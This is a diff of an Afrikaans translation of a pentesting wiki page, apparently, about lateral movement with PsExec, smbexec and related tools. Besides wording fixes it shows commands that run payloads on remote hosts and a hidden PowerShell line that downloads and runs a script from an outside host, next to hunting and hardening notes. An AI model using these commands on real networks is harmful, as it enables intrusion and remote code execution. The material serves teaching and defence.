@@ -9,13 +9,13 @@ Hierdie tegnieke misbruik die Windows Service Control Manager (SCM) op afstand o
 1. Verifieer by die teiken en toegang tot die ADMIN$ deel oor SMB (TCP/445).
 2. Kopieer 'n uitvoerbare lêer of spesifiseer 'n LOLBAS-opdraglyn wat die diens sal uitvoer.
 3. Skep 'n diens op afstand via SCM (MS-SCMR oor \PIPE\svcctl) wat na daardie opdrag of binêre wys.
-4. Begin die diens om die payload uit te voer en opsioneel stdin/stdout via 'n benoemde pyplyn vas te vang.
+4. Begin die diens om die payload uit te voer en opsioneel stdin/stdout via 'n benoemde pyp te vang.
 5. Stop die diens en maak skoon (verwyder die diens en enige gelaat binêre).
 
 Vereistes/voorvereistes:
 - Plaaslike Administrateur op die teiken (SeCreateServicePrivilege) of eksplisiete diens skeppingsregte op die teiken.
 - SMB (445) bereikbaar en ADMIN$ deel beskikbaar; Afstandsdiensbestuur toegelaat deur die gasvuurmuur.
-- UAC Afstandsbeperkings: met plaaslike rekeninge kan tokenfiltrering admin oor die netwerk blokkeer tensy die ingeboude Administrator of LocalAccountTokenFilterPolicy=1 gebruik word.
+- UAC Afstandsbeperkings: met plaaslike rekeninge kan tokenfiltrering admin oor die netwerk blokkeer tensy die ingeboude Administrateur of LocalAccountTokenFilterPolicy=1 gebruik word.
 - Kerberos teen NTLM: die gebruik van 'n hostname/FQDN stel Kerberos in staat; verbinding deur IP val dikwels terug na NTLM (en kan geblokkeer word in geharde omgewings).
 
 ### Handmatige ScExec/WinExec via sc.exe
@@ -78,8 +78,8 @@ psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe
 # Change service name and output encoding
 psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
 ```
-Artifacts
-- Tydelike EXE in C:\Windows\ (eweklike 8 karakters). Diensnaam is standaard RemComSvc tensy oorgeskryf word.
+Artefakte
+- Tydelike EXE in C:\Windows\ (ewekans 8 karakters). Diensnaam is standaard RemComSvc tensy oorgeskryf.
 
 ### Impacket smbexec.py (SMBExec)
 
@@ -99,7 +99,7 @@ SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
 SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
 ```
-- Jy kan ook CrackMapExec gebruik om uit te voer via verskillende agtergronde (psexec/smbexec/wmiexec):
+- Jy kan ook CrackMapExec gebruik om via verskillende agtergronde (psexec/smbexec/wmiexec) uit te voer:
 ```bash
 cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
 cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
@@ -114,30 +114,32 @@ Tipiese gasheer/netwerk artefakte wanneer PsExec-agtige tegnieke gebruik word:
 - Registrasie artefak vir Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 op die operateur gasheer (indien nie onderdruk nie).
 
 Jag idees
-- Waak op diens installs waar die ImagePath cmd.exe /c, powershell.exe, of TEMP plekke insluit.
-- Soek na proses skep waar ParentImage C:\Windows\PSEXESVC.exe is of kinders van services.exe wat as LOCAL SYSTEM shell uitvoer.
+- Alarmering op diens installs waar die ImagePath cmd.exe /c, powershell.exe, of TEMP plekke insluit.
+- Soek na proses skep waar ParentImage C:\Windows\PSEXESVC.exe of kinders van services.exe wat as LOCAL SYSTEM shells uitvoer.
 - Merk naam pype wat eindig op -stdin/-stdout/-stderr of bekende PsExec kloon pyp name.
 
 ## Probleemoplossing algemene mislukkings
 - Toegang is geweier (5) wanneer dienste geskep word: nie werklik plaaslike admin nie, UAC afstand beperkings vir plaaslike rekeninge, of EDR tampering beskerming op die diens binêre pad.
 - Die netwerk pad is nie gevind nie (53) of kon nie met ADMIN$ verbind nie: firewall blokkeer SMB/RPC of admin deel is gedeaktiveer.
 - Kerberos misluk maar NTLM is geblokkeer: verbind met hostname/FQDN (nie IP nie), verseker behoorlike SPNs, of verskaf -k/-no-pass met kaartjies wanneer Impacket gebruik word.
-- Diens begin neem te lank maar payload het gedra: verwag as dit nie 'n werklike diens binêre is nie; vang uitvoer in 'n lêer of gebruik smbexec vir lewendige I/O.
+- Diens begin tydens uit maar payload het gedra: verwag as dit nie 'n werklike diens binêre is nie; vang uitvoer in 'n lêer of gebruik smbexec vir lewendige I/O.
 
 ## Versterking notas
-- Windows 11 24H2 en Windows Server 2025 vereis SMB ondertekening standaard vir uitgaande (en Windows 11 inkomende) verbindings. Dit breek nie wettige PsExec gebruik met geldige kredensiaal nie, maar voorkom ongetekende SMB relay misbruik en kan toestelle beïnvloed wat nie ondertekening ondersteun nie.
-- Nuwe SMB kliënt NTLM blokkering (Windows 11 24H2/Server 2025) kan NTLM terugval voorkom wanneer verbind met IP of na nie-Kerberos bedieners. In versterkte omgewings sal dit NTLM-gebaseerde PsExec/SMBExec breek; gebruik Kerberos (hostname/FQDN) of stel uitsonderings in indien wettig nodig.
-- Beginsels van minste voorreg: minimaliseer plaaslike admin lidmaatskap, verkies Just-in-Time/Just-Enough Admin, handhaaf LAPS, en monitor/waak op 7045 diens installs.
+- Windows 11 24H2 en Windows Server 2025 vereis SMB ondertekening standaard vir uitgaande (en Windows 11 inkomende) verbindings. Dit breek nie legitieme PsExec gebruik met geldige krediete nie, maar voorkom ongetekende SMB relay misbruik en kan toestelle beïnvloed wat nie ondertekening ondersteun nie.
+- Nuwe SMB kliënt NTLM blokkering (Windows 11 24H2/Server 2025) kan NTLM terugval voorkom wanneer verbind met IP of na nie-Kerberos bedieners. In versterkte omgewings sal dit NTLM-gebaseerde PsExec/SMBExec breek; gebruik Kerberos (hostname/FQDN) of stel uitsonderings in indien legitiem nodig.
+- Beginsels van minste voorreg: minimaliseer plaaslike admin lidmaatskap, verkies Just-in-Time/Just-Enough Admin, handhaaf LAPS, en monitor/alarm op 7045 diens installs.
 
 ## Sien ook
 
-- WMI-gebaseerde afstand exec (dikwels meer fileless):
+- WMI-gebaseerde afstand exec (dikwels meer lêervry):
+
 
 {{#ref}}
 ./wmiexec.md
 {{#endref}}
 
 - WinRM-gebaseerde afstand exec:
+
 
 {{#ref}}
 ./winrm.md
